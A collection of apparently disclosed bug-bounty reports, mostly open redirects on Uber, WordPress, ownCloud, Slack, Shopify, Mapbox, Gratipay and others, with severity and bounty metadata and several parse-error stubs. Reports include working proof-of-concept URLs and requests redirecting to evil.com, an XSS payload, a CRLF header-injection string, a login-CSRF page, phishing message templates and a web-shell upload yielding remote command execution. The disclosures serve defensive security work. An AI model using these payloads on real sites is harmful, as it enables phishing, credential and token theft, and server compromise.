+
+
+# Exploiting
+ok, now I can encrypt something by `?uuid=whatever` and decrypt something by `?EQ=whatever`
+
+so I can decrypt all the cipher by `?EQ=whatever` (remember the padding...)
+
+And I can create any cipher by **CBC cut and paste attack**
+For Example, I encrypt `@orange.tw/?` and paste and cipher to bellow URL, when you access URL, you will redirect to orange.tw(my website)
+```
+http://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bc9a3bb1c67bf3b0edc8be7c80b4a998d2ce17fd5dd704e741309ec46b0627b0c1924321b894eebbc0128fce2b552959e
+```
+
+I think this vulnerability also can lead to XSS by creating an URL like
+```
+data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+```
+if I have more time doing research ( it's evening in my country now :O )
+
+
+# Attachments
+
+`fake.py` is my Python poc
+`2016-03-26_172607.jpg` decrypt the last block of cipher (%08%08%08%08%08%08%08%08 represented it use PKCS #5 padding)
+
+
+
+===== RDIR-127741 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-129091 | CPU utilization 99% on visiting wordpress site url & open redirect found | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1626
+**Working POC for making CPU 99% for wordpress user**
++ Login to wordpress account
++ Visit any of the below url's which are sent by attacker to victim (since these are wordpress url so victim will accept & open)
+1.https://wordpress.com/post/20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+2.https://wordpress.com/design/1000000000000000000000
+3.https://wordpress.com/pages/anurag.wordpress.com/-10000000000000000000000000000000000000000000000
++ Check your CPU usage in task manager. It would go to 99% as shown in attached.
++ This happens since these pages continues to send unlimited requests to https://pixel.wp.com/g.gif?v=wpcom-no-pv&x_newdash_pageviews=route&t=0.1642450245826501
++ Unlimited request are send since I think the variable holding the Post id cannot hold a value as long as 20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 which throws an exception.
++ **Problem:** User CPU goes 99% causing the browser to go very very slow & unresponsive. Negative impact on customer.
+
+**Working POC for open redirect**
++ Access wordpress using url https://wordpress.com/wp-login.php?redirect_to=https%3A%2F%2Fgoogle.com%2Fsearch?q=myFakeSite&reauth=1
++ After login you will be redirected to https://www.google.co.in/search?q=myFakeSite&gws_rd=cr&ei=WLYGV8fUHIq8uATj56uIBA which is incorrect. Wordpress should not allow redirecting to external websites like google,yahoo.
++ **Problem:** In future if there is any bug in these external site then this open redirect from wordpress could cause harm to users.
+
+
+===== RDIR-131082 | Open Redirector via (apps/files_pdfviewer) for un-authenticated users. | sev= | bounty=150.0 | substate=resolved | weak=Open Redirect | len=1613
+Affected Products:  OWNCLOUD (https://demo.owncloud.org/index.php/apps/files_pdfviewer)
+Version Tested: v1.0.712, other versions might be vulnerable
+Class:	Open Redirector
+Remote:	Yes
+
+A non authenticated user can be easily tricked into following one of the following links in order to download a supposedly uploaded file on an owncloud instance:
+The EvilFile the pdfviewer is trying to redirect will not load in the viewer automatically. But if the user clicks the download button on the right upper corner of the viewer any file will be downloaded instantly and the browser will be redirected to a different domain (ex. https://evildomain.xx ).
+
+****OPEN REDIRECT Attack Replication Steps: 
+
+Step 1: Visit https://demo.owncloud.org/index.php/apps/files_pdfviewer?file=https://evildomain.xx/EvilFile.xx [ Check POC1.jpg ]
+
+Step 2: Click Download button on the right upper corner of the viewer.
+
+Step 3: Browser is redirected to https://evildomain.xx/EvilFile.xx
+
+Comment: No user authentication is required for the user to be redirected. All owncloud installations in the wild are vulnerable to this attack.
+
+
+****Example Phishing Message with OPEN REDIRECT Attack:
+
+
+Message:
+
+Please view the files i have shared with you by following the link below, if this file is not automatically opened please click the download button on the right upper corner: 
+
+https://demo.owncloud.org/index.php/apps/files_pdfviewer?file=https://evildomain.xx/remote.php/webdav/Demo.pdf%20%3CIf%20this%20file%20is%20not%20available%20please%20click%20the%20dowload%20button%20on%20the%20right%20upper%20corner%3E [ Check POC2.jpg ]
+
+
+
+
+===== RDIR-131552 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-131728 | Open Redirect vulnerability in moneybird.com | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=179
+Reporter found an unvalidated redirect in our login procedure. We have added validations to make sure the redirection always points to our own software.
+[team summary] [](\\empty)
+
+
+===== RDIR-132251 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-138786 | Text injection can be used in phishing 404 page and should not include attacker text | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=627
+Hello i want to report a text injection and a missconfiguration of the 404 page which can be used in phishing
+
+the bug exists at :
+
+http://veris.in/test/%2f../It%20has%20been%20changed%20by%20a%20new%20one%20https://www.crowdcurity.com%20so%20go%20to%20the%20new%20one%20since%20this%20one
+
+As you can see attacker text is included 
+"It has been changed by a new one https://www.crowdcurity.com so go to the new one since this one was not found on this server."
+
+Fix : just use a 404 page that don't include attacker text just as : hackerone do (a 404 page that don't include any external text 
+
+Hope you fix it
+
+Thanks,
+Kanwar
+
+
+===== RDIR-140432 | configure a redirect URI for Facebook OAuth | sev=medium | bounty=None | substate=resolved | weak=Improper Authentication - Generic | len=851
+Hey,
+
+Its me again. since the Login with Facebook doesnt have a dedicated directory like gratipay.com/facebook/callback it is possible to still steal access tokens.
+
+https://www.facebook.com/dialog/oauth?response_type=code&client_id=144124902390407&redirect_uri=https://gratipay.com/~attacka/&scope=public_profile%2Cemail%2Cuser_friends&state=mjemgKNb0s24lbEqBcyVqDEVNoYDYs
+
+As you can see it will send the token to my profile (/~attacka) and my profile points to example.com, if the user clicks on that link the referrer header will send tokenz (obviously lol)
+
+gratipay also imports pictures from 3rd parties, forexample my img src is from ls.googleusercontent.com which means it will also leak the access_tokens to there.
+
+Fix: add the redirect uri like: https://www.gratipay.com/facebook/callback so users have no way to tamper with it.
+
+Thanks,
+P
+
+
+===== RDIR-140447 | Open Redirect on slack.com | sev= | bounty=500.0 | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=2852
+Hi, my report has tow interesting parts here
+First
+======
+In this report #104087 the attacker uploads a svg file to execute JavaScript and redirect to any domain
+I have found a new way to execute full html files on victim machine instead of downloading them by adding a bunch of binary chars before html code
+
+### Please have a look at screenshots attached here to get what I mean.
+### Steps
+1. login to your account and send the following request:
+
+Note: I can't get binary chars displayed here so I attached a file containing the whole request
+
+```
+POST /api/files.uploadAsync HTTP/1.1
+Host: upload.slack.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Length: 886
+Content-Type: multipart/form-data; boundary=---------------------------89481407720596
+Origin: https://<subdomain>.slack.com
+Connection: keep-alive
+
+-----------------------------89481407720596
+Content-Disposition: form-data; name="file"; filename="pixel.png"
+Content-Type: text/html
+
+<bunch_of_binary_chars_here>
+<html>
+<script>
+window.location='http://www.evil.com';
+</script>
+</html>
+-----------------------------89481407720596
+Content-Disposition: form-data; name="filename"
+
+pixel
+-----------------------------89481407720596
+Content-Disposition: form-data; name="token"
+
+<token>
+-----------------------------89481407720596
+Content-Disposition: form-data; name="channels"
+
+<channels>
+-----------------------------89481407720596
+Content-Disposition: form-data; name="title"
+
+pixel
+-----------------------------89481407720596
+Content-Disposition: form-data; name="initial_comment"
+
+hi
+-----------------------------89481407720596--
+
+```
+
+2. Make public link for "pixel" file "https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=[REDACTED_SECRET]"
+
+3. Complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=[REDACTED_SECRET]"
+
+4. Whenever a victim clicks the previous link he will get to "http://www.evil.com"
+
+Second
+======
+I have found another way to make the redirect link very simple and more tricky
+The attacker can just use slack main domain using this link "https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=[REDACTED_SECRET]" to redirect victims to "http://www.evil.com".
+
+There are many other attack scenarios can be achieved here cause the attacker has full control over file content and name also.
+
+Here is a simple phishing login page I have created as PoC that could trick even advanced users to submit their credentials to the attacker "https://slack.com/files-pri/T1ARLSGBS-F1AVC33M5/login?pub_secret=[REDACTED_SECRET]" 
+
+Attacker could do tons of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc.
+
+
+===== RDIR-141355 | Open Redirect in unifi.ubnt.com [Controller Finder] | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=265
+Description :
+
+An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.
+
+
+[team summary] 
+
+
+===== RDIR-143240 | XSS on www.mapbox.com/authorize/ because of open redirect at /core/oauth/auth | sev= | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=2236
+Description
+---
+When you load the endpoint https://www.mapbox.com/authorize/ a GET request is made to the endpoint https://www.mapbox.com/core/oauth/auth with the parameters passed in the request to https://www.mapbox.com/authorize/. 
+If you only send the parameter __redirect_uri__ in the request to https://www.mapbox.com/core/oauth/auth, the response from the server is a 302 redirect to the value passed in the parameter __redirect_uri__.
+If the response from the latest request (after the redirect) is valid like:
+```json
+{
+  "authorize_url": "/authrozie/...",
+  "stage": "authorize",
+  "user": {
+    "name": "some-name",
+    "extraTm2z": 1
+  },
+  "origin": ""
+}
+```
+the content is used to render the template __template-modal-oauth__ in https://www.mapbox.com/authorize/.
+
+The problem is that the value of the property `"authorize_url"` is not escaped when passed to the template
+```html
+<form id='oauth' method='post' action='<%=App.api + obj.authorize_url%>' class='col6 modal-body fill-white'>
+...
+```
+which allows to break the `<form>` using `'>` and insert HTML and Javascript code.
+
+Reproduction steps
+---
+1. Create a file with this content in a server that supports __https://__
+
+      ```json
+      {
+        "authorize_url": "'><script>alert(document.domain);</script>",
+        "stage": "authorize",
+        "user": {
+          "name": "nombre",
+          "extraTm2z": 1
+       },
+       "origin": ""
+     }
+     ```
+
+2. Set these headers to be returned in the response when serving the file (I don't specify how because it varies from server to server and language)
+
+      ```
+      Access-Control-Allow-Origin: https://www.mapbox.com
+      Access-Control-Allow-Credentials: true
+      Access-Control-Allow-Headers: x-requested-with
+      ```
+
+3. Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge
+
+      ```
+      https://www.mapbox.com/authorize/?redirect_uri=[url_to_file_created_in_step_1]
+      ```
+
+4. `alert(document.domain)` is executed
+
+Proof of concept
+---
+Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge
+```
+https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json
+```
+
+I'm going to do a screen recording and upload it.
+
+
+===== RDIR-143265 | Unvalidated redirect on user profile website | sev= | bounty=None | substate=informative | weak=Open Redirect | len=394
+The user profile redirect request is not properly validated. The presence of parameter t which is being passed through the request is verified but same value can be reused to any unauthenticated or authenticated user to redirect them to any web site.
+
+Sample link is given below.
+
+https://www.zomato.com/redirect?u=http%3A%2F%2Ftest.com&t=38dc43d5f007f4c5d974f6c74f065158&g=user-profile-website
+
+
+===== RDIR-144525 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-145306 | Registeration Link "Jacking&Redirecting" | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1383
+Hello Team ,
+i found dangerous issue in your register application ,
+once i tried to register , the request was like that :
+
+~~~~~~~~~~
+
+POST /portal/register/ HTTP/1.1
+Host: sandbox.veris.in
+User-Agent: [[My 'User-Agent' Details]]
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://sandbox.veris.in/portal/register/
+Content-Length: 1139
+Cookie: csrftoken=[[CSRF]]
+Connection: close
+
+csrfmiddlewaretoken=[[CSRF]]&email=[[registered Email]]&g-recaptcha-response=[[reCaptcha]]&sub_link=----------->portal%2Fverify-email<--------------
+
+
+~~~~~~~
+
+when i edited the "sub_link" parameter with another website , ex : "example.com" .
+
+it sends to the [[registered Email]] to verify his/her account . i realized that the link was edited to be like this :
+
+http://example.com/registered@Email/verification/code/ !!!
+
+user will be redirected to evil website that comes from YOUR COMPANY email telling the user to continue the registeration process .
+
+some Evil-Hacker can do Evil-Things , like :
+1) redirect to Evil Page , includes some Evil codes !
+2) redirect to his OWN website , listening on port , jacking the verification code !
+3) force the user with "Social Engineering" tricks to change his/her account details from Evil-Hacker website . 
+and much more ...
+
+
+===== RDIR-145392 | Response Header injection using redirect_uri together with PHP that utilizes Header Folding according to RFC1945 and Internet Explorer 11 | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=1214
+Hi,
+I noticed that the `redirect_uri` used to redirect users to any location on the page, passes in all data into a `header("Location..` without any validation. The problem is that PHP (current PHP-versions of Debian/Ubuntu, there seem to be a patch properly in place in other dists) actually built the header-function according to RFC1945 which says:
+
+```
+HTTP/1.0 headers may be folded onto multiple lines if each
+continuation line begins with a space or horizontal tab. All linear
+whitespace, including folding, has the same semantics as SP.
+```
+Ref: https://tools.ietf.org/html/rfc1945#page-11
+
+This means that doing the following request:
+
+http://nextcloud/index.php?redirect_url=/%3f%0d%0a%09set-cookie:+hello=yoyoo
+
+Will result in the following response:
+```
+Location: http://nextcloud/?
+	set-cookie: hello=yoyoo
+```
+
+The problem is that IE is actually not caring at all about that rule from RFC1945 and will strip the tab-character from that header and listen to it:
+
+{F99965}
+
+You should most likely disallow this character sequence completely so the failed backported versions of PHP won't do this. Properly secured PHP versions will fail doing the request due to new-lines in the header.
+
+Regards,
+Frans
+
+
+===== RDIR-148640 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-151831 | User Supplied links on profile page is not validated and redirected via gratipay. | sev=none | bounty=None | substate=duplicate | weak=Open Redirect | len=1497
+User Supplied links on profile page is not validated and redirected via gratipay.
+====================
+
+Description
+---------------------
+The user profiles on gratipay has a profile statement section which is supported by markdown. An adversary can update the profile section with a hyper link URL to a malicious website. As gratipay doesn't redirect the request via a 302 redirect response if the adversary register a similar phishing website the user won't be aware that he/she is going out of the trusted site (gratipay)
+
+Detailed Steps
+---------------------
+**Step 1:** Update the profile statement with a URL hyperlink.
+**Step 2:** Click on the hyperlinked URL on the updated profile. It can be observed that the server issues no warning that the user is being redirected out of gratipay.
+
+Solution
+---------------------
+* All user supplied URL's in the website must be redirected via the server only. 
+* On implementing URL redirection, care should be taken that it is not vulnerable to Open Redirection [OWASP Open Redirection](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
+* A warning should be issued when a user is clicking on a website outside the host website. For example in the below line I am hyperlinking SecVibe website to the text of URL of hackerone.com. It can be observed that on clicking the same, hackerone verifies if the same is in fact a site outside hackerone and issues a warning.
+[http://hackerone.com](https://secvibe.com)
+{F105371}
+
+
+
+===== RDIR-153652 | Redirect url after login is not validated | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=968
+Hey,
+
+I have noticed and redirect hidden field in admin/staff login page so I though give it a little shot! 
+
+What happened another user create a Shopify page with bad javascript code in it.
+
+and when any user or owner login with following traversal URL he/she will be redirected to bad js containing a page with any intentional.
+
+"https://capripio.myshopify.com/admin/auth/login?redirect=../pages/about-us"
+
+I am well aware of the following description on your bug bounty page.
+"Any issue where a store administrator is able to insert javascript in the storefront area of their own store, including the checkout pages."
+
+But I think security issue is greater here as you were aware of above statement so it might be dangerous to redirect someone to a bad page on a front store, so I submitted.
+
+Please see POC video for more demo. available at private dropbox folder follow link below:
+https://www.dropbox.com/s/49odz7owp1oj53t/poc.zip?dl=0
+
+Sorry for my bad English!
+
+
+===== RDIR-155222 | (BYPASS) Open Redirect after login at http://ecommerce.shopify.com | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=425
+Hi,
+
+The users can be redirected to some other site which is in control of the attacker from http://ecommerce.shopify.com/accounts
+
+Let's say user is attacker asked victim to login from the here :
+https://ecommerce.shopify.com/accounts?return_to=%40evil.com/
+
+When victim enters the password he is redirected to https://evil.com
+
+These can be controlled by the attacker and used in other attacks
+
+Works in all browsers!!
+
+
+
+
+
+
+
+===== RDIR-157465 | Host Header Injection/Redirection Attack | sev=none | bounty=None | substate=not-applicable | weak=Command Injection - Generic | len=863
+Hello,
+
+__I'm sorry for adding this, please allow me to close if you do not accept the risk involved.__
+
+Gratipay is vulnerable to host header injection because the host header can be changed to something outside the target domain (ie. gratipay.com and grtp.co) and cause it to redirect to to that domain instead.
+
+Attack vectors are somewhat limited but depends on how the host header is used by the back-end application code. If code references the hostname used in the URL such as password reset pages, an attacker could spoof the host header of the request in order to trick the application to forwarding the password reset email to the attackers domain instead, etc. Other attack vectors may also be possible through manipulation of hyperlinks or other misc. code that relies on the host/domain of the request.
+
+__PoC:__
+{F110430}
+
+Regards,
+Shuaib Oladigbolu
+
+
+===== RDIR-158019 | Host Header Injection/Redirection in: https://www.instacart.com/ | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1114
+Hi,
+
+Your website is vulnerable to Host Header Injection because the host header can be changed to something outside the target domain
+
+In many cases, developers are trusting the HTTP Host header value and using it to generate links, import scripts and even generate password resets links with its value. This is a very bad idea, because the HTTP Host header can be controlled by an attacker. This can be exploited using web-cache poisoning and by abusing alternative channels like password reset emails.
+
+GET / HTTP/1.1
+Host: google.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+
+HTTP/1.1 301 Moved Permanently
+Date: Tue, 09 Aug 2016 23:55:09 GMT
+Location: https://google.com/
+Server: nginx
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Connection: Close
+Content-Type: text/html
+Content-Length: 178
+
+Reference: https://www.acunetix.com/vulnerabilities/web/host-header-attack
+
+Regards,
+Clarck
+
+
+===== RDIR-158034 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-158148 | reverb.twitter.com redirects to vulnerable reverb.guru | sev= | bounty=None | substate=resolved | weak= | len=2486
+Hi!
+
+http://reverb.twitter.com redirects requests to http://reverb.guru which hosts a vulnerable PHP application. I managed to get RCE there which allows to modify the contents of this site, so that reverb.twitter.com will redirect to a phishing page or force a malicious file download.
+
+I was able to get RCE on reverb.guru the following way. By analyzing intercepted requests I discovered http://reverb.guru/api/actions/fileUpload.php. The script allows to upload images on the server (needs a valid Twitter auth):
+
+```http
+POST /api/actions/fileUpload.php HTTP/1.1
+Host: reverb.guru
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-NewRelic-ID: UwYFUF5WGwcCUlNVAgk=
+X-Requested-With: XMLHttpRequest
+Referer: http://reverb.guru/authoring/
+Cookie: _ga=GA1.2.1164992843.1470821302; _gat=1; PHPSESSID=ckdlhrcaioq3mnp4n68asvb3i3
+Connection: close
+Content-Type: multipart/form-data; boundary=--------541639189
+Content-Length: 121
+
+----------541639189
+Content-Disposition: form-data; name="image_file"; filename="test.jpg"
+
+IMAGE_DATA
+----------541639189--
+```
+
+```http
+HTTP/1.1 200 OK
+Date: Wed, 10 Aug 2016 10:56:27 GMT
+Server: Apache
+X-NewRelic-App-Data: PxQAUVRSAAYTUFNUBQYCXkYdFGQHBDcQUQxLA1tMXV1dORY0QwhvTQVGXj1JAltHWQsPEWseUQ8IVGNDDgkCBh4SUBIaFAQcA1UJUQFNA0xUBgVTUU8VAhxGVwZWVAVfBQAPAwAEBQMDUxpOXllYQVY4
+Content-Length: 57
+Connection: close
+Content-Type: application/json
+
+{"image_path":"\/view\/data\/logos\/test_3922005924.jpg"}
+```
+
+The original extension is preserved, so to upload a web shell one needs just to use .php extension. However during the upload image is cropped to a 50x50 square, and the injected web shell is removed from the image. In order to deliver the web shell in the image, it is necessary to learn image quality after resizing. Luckily, uploaded image contains this information:
+
+{F111074}
+
+The next step is to generate a 50x50 jpeg image with 75% quality ratio and inject a web shell into it. There is a nice PoC that can generate such file for us: http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l
+
+After our crafted jpeg has been uploaded, we can see that web shell survived resizing:
+
+{F111077}
+
+Now, switching to php extension it is possible execute arbitrary commands (http://reverb.guru/view/data/logos/test_4992504809.php?c=id ):
+
+{F111078}
+
+Suggested mitigation is to get rid of this redirect or the entire subdomain.
+
+Thank you!
+
+
+===== RDIR-158434 | (BYPASS) Open redirect and XSS in supporthiring.shopify.com | sev= | bounty=None | substate=resolved | weak=Cross-Site Request Forgery (CSRF) | len=593
+Hello,
+
+The users can be redirected to some other site which is in control of the attacker from 
+
+Vulnerable parameter: path=
+
+You have a protection here at path= but it bypass the parameter if you add a double slash, like %2F%2F.
+
+Let's say user is attacker asked victim to came to this page: :
+http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-challenge?&path=%2F%2Fevil.com
+
+Victim will be see a 404 error page and after 2 seconds he will be redirected to: https://evil.com
+
+These can be controlled by the attacker and used in other attacks
+
+Works in all browsers!!
+
+
+
+
+
+===== RDIR-159275 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-159522 | Open redirect using checkout_url | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1138
+Hi , I would like to report an open redirect issue in `<account>.myshopify.com/account/logout` and `<account>.myshopify.com/account/login`
+#Details:
+Your application allow redirecting to `https://checkout.shopify.com/` through `https://<shop>.myshopify.com/account/logout?return_url=<url>` 
+The page `https://checkout.shopify.com/<Store_id>` will display the 404 page of the store. 
+
+Here is how this can be used for open redirection: 
+1. Attacker creates a store then adds a new URL redirect with `/[Store_id]` in the **Old path** field and the malicious website(e.g:evil.com) in the **Redirect to** field.
+{F112369}
+2. Attacker sends the victim a link like this: 
+`https://<victim>.myshopify.com/account/logout?return_url=https://checkout.shopify.com/[Attacker's_store_id] `
+3. The victim will be redirected to the malicious website. 
+
+#PoC:
+`https://<account>.myshopify.com/account/logout?return_url=https://checkout.shopify.com/14372648`
+This will redirect you to evil.com
+
+`https://<account>.myshopify.com/account/login?checkout_url=https://checkout.shopify.com/14372648`
+This will redirect you to evil.com after you login. 
+
+Thanks!
+
+
+===== RDIR-160047 | [apps.shopify.com] Open Redirect | sev= | bounty=500.0 | substate=resolved | weak=Open Redirect | len=199
+**PoC**
+`https://apps.shopify.com//blackfan.ru/`
+
+**HTTP Response**
+```
+HTTP/1.1 301 Moved Permanently
+Server: Cowboy
+Date: Wed, 17 Aug 2016 11:48:27 GMT
+Connection: close
+Location: //blackfan.ru
+```
+
+
+===== RDIR-160498 | window.opener is leaking to external domains upon redirect on Safari | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=438
+Although Coinbase cleared window.opener on external redirects, it was not effective on WebKit-based browsers (Safari) since Safari's cross-origin security prevents the modification of window.opener of a child window if it lies on a different origin, yet still allows the child window to access window.opener.location.
+
+
+The solution, proposed by the reporter, was to add rel="noreferrer noopener" to these external links.
+
+[team summary] 
+
+
+===== RDIR-161991 | Open Redirect possible in https://www.shopify.com/admin/ | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=415
+To allow documentation pages to provide convenient links to shops' admin pages, requests to `https://www.shopify.com/admin/*` redirect the user to `https://<shop-name>.myshopify.com/admin/*`, where `<shop-name>` is filled in based on the value of the `last_shop` cookie.
+
+Because input validation was missing, any `last_shop` value would be accepted, thereby allowing an open redirect to any domain.
+[team summary] 
+
+
+===== RDIR-163124 | [skyliner.io / qa.skyliner.io] Open Redirect | sev= | bounty=None | substate=duplicate | weak=Open Redirect | len=289
+**PoC**
+```
+https://skyliner.io//blackfan.ru/
+https://qa.skyliner.io//blackfan.ru/
+```
+
+**HTTP Response**
+```
+HTTP/1.1 301 Moved Permanently
+Content-Length: 0
+Connection: close
+Date: Wed, 24 Aug 2016 17:30:39 GMT
+Location: //blackfan.ru
+```
+
+https://cwe.mitre.org/data/definitions/601.html
+
+
+===== RDIR-163272 | OPEN URL REDIRECT through PNG files | sev=medium | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=271
+An abuse of the image_url parameter when saving a CS program was able to create an arbitrary external redirect.  We now validate the parameter before using it.
+[team summary] I have found a way through which an attacker can use png files to redirect to malicious domain .
+
+
+===== RDIR-163707 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-164895 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-165046 | Open redirect allows changing iframe content in *.myshopify.com/admin/themes/<id>/editor | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1124
+Hi ,
+
+I managed to bypass the fix you deployed to the issue I reported in #159522.
+Apparently this is what the fix does:
+
+- Redirecting to `https://checkout.shopify.com/<exact_store_id> /` only is allowed.
+- For example: `victim.myshopify.com/account/logout?return_url=https://checkout.shopify.com/<victim_store_id>/` will work 
+
+- but `victim.myshopify.com/account/logout?return_url=https://checkout.shopify.com/<attacker_store_id>/` won't work 
+- `https://checkout.shopify.com/<store_id>` no longer follows the 302 redirect rules added in the admin dashboard.
+
+##Redirect bypass: 
+
+`<victim>.myshopify.com/account/logout?return_url=https://checkout.shopify.com/<victim_store_id>/../14467660` 
+
+Note that `14467660` is the attacker's store id.
+
+The 302 redirect no longer works , but the attacker can still inject any HTML/JavaScript code in his store's 404 page that will redirect to any domain he wants.
+
+##Change theme editor iframe content:
+
+Here is the PoC:
+`https://<your_store>.myshopify.com/admin/themes/<theme_id>/editor#/account/logout?return_url=https://checkout.shopify.com/<your_store_id>/../14467660`
+
+Thanks!
+
+
+===== RDIR-165136 | target="_blank" Vulnerability Resulting in Critical Phishing Vector | sev= | bounty=None | substate=informative | weak=Open Redirect | len=944
+**Description**
+I have a script running on my server which gives me full control over a visitor's window object. This allows me to replace the user's legitimate mapbox.com session with my own Mapbox phishing form (not live). As you can see from the proof-of-concept video below, this vulnerability works cross-origin. This is an extremely effective phishing vector and should be remediated ASAP. 
+
+**Video PoC:** {F116642}
+
+**Reproduction Steps:**
+1. Navigate to my map at https://www.mapbox.com/editor/?id=chasemiller5.19coghk8#data
+2. Click on my website link in the description (http://chasemiller.me/hax/mapbox_test.html) 
+3. This should open the link and change the user's legitimate mapbox.com session to my malicious Mapbox login phishing page (not active) (behavior may vary slightly between browsers).
+
+**Mitigation:**
+This bug can be easily mitigated by using the 'noopener' link type. This sets the 'window.opener' property to 'null'
+
+
+===== RDIR-167107 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-169759 | Open redirect in bulk edit | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=243
+Hi , 
+I have found an open redirection issue when bulk editing resources.
+#PoC:
+Go to `https://<shop>.myshopify.com/admin/bulk?resource_name=Product&return_to=/..//evil.com` then click the **Close** button and you'll go to *evil.com* 
+
+Thanks!
+
+
+===== RDIR-171398 | (HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation | sev=low | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=1690
+###Summary:###
+
+Login CSRF, Open Redirect, and Self-XSS Possible Exploitation through HackerOne SSO-SAML
+
+###PoC###
+
+- Go to █████;
+
+Use a browser window with clear cookies.
+
+Source-code:
+
+```
+<html>
+<body>
+	<iframe id="login_csrf_frame" src="████████" style="width:0;height:0;border:0;border:none;"></iframe>
+	<script>
+		setTimeout(function(){document.location.href = "https://hackerone.com/users/saml/sign_in?email=████&remember_me=true";}, 5000);
+	</script>
+</body>
+</html>
+```
+
+###Impact:###
+
+1) Information Leak
+
+An attacker can use Logout CSRF + Login CSRF against a victim to steal all information sent by the victim to the HackerOne website while using the malicious session, including confidential bug reports.
+
+2) Open Redirect
+
+Since the SSO-SAML l​ogin flow can be started automatically (`GET https://hackerone.com/users/saml/sign_in?email=███`) by an attacker and it redirects to external URLs, the attacker can redirect the user to anywhere.
+
+3) Self-XSS Possible Exploitation​
+
+Some stored Self-XSS's (internal areas accessed just by the victim, etc.) can be exploited through Login CSRF.
+
+```
+Malicious page -> HackerOne Login CSRF -> Self-XSS triggers -> Logout -> Wait user actions
+```
+
+If the user interacts with the page (sign in with his account, etc.), the attacker can exploit the Self-XSS.
+
+P.S.:
+
+An attacker can add extra dots to the SAML Email Domain in the config dialog.
+I didn't test all the implications, but registering a very similar domain could be a bad thing, like `hackerone..com`, `hackerone.com.`, `.hackerone.com` or even `gmail..com` because of typing mistakes (`[REDACTED_EMAIL] would redirect the victim to the attacker external login flow`).
+
+
+===== RDIR-172363 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-172696 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-172746 | WebSummit - Open Redirect  | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=567
+Same Open Redirect issue at 3 websites:
+
+-https://forms.moneyconf.com/gates
